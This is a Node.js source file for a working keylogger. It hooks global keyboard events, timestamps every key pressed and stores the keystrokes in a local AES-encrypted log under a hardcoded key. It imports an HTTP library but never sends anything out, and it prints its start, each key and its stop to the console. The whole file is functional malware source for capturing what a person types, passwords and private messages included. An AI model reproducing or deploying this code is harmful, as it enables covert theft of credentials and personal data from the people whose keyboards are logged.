const { GlobalKeyboardListener } = require("node-global-key-listener");
const fs = require("fs");
const CryptoJS = require("crypto-js");
const axios = require("axios");
const path = require("path");

const listener = new GlobalKeyboardListener();

const logFile = path.join(__dirname, "keylogs.enc");
const secretKey = "Admin@2025";
// const

console.log("🔐 Keylogger started. Press any key....");

function encrypt(text) {
   return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function decrypt(cipher) {
   const bytes = CryptoJS.AES.decrypt(cipher, secretKey);
   return bytes.toString(CryptoJS.enc.Utf8);
}

function writeEncryptedLog(line) {
   let encrypted = "";

   if (fs.existsSync(logFile)) {
      const old = fs.readFileSync(logFile, "utf8");
      const decrypted = decrypt(old);
      encrypted = encrypt(decrypted + line);
   } else {
      encrypted = encrypt(line)
   }

   fs.writeFileSync(logFile, encrypted, "utf8")
}

// capture event keys
listener.addListener((event) => {
   if (event.state === "DOWN") {
      const key = event.name;
      const timestamp = new Date().toISOString();
      const line = `[${timestamp}] ${key}`;

      writeEncryptedLog(line);
      process.stdout.write(key + " ");

      if (key == "ESCAPE") {
         console.log("\n🔐 Keylogger stopped, Exiting keylogger session.....");
         process.exit();
      }
   }
})
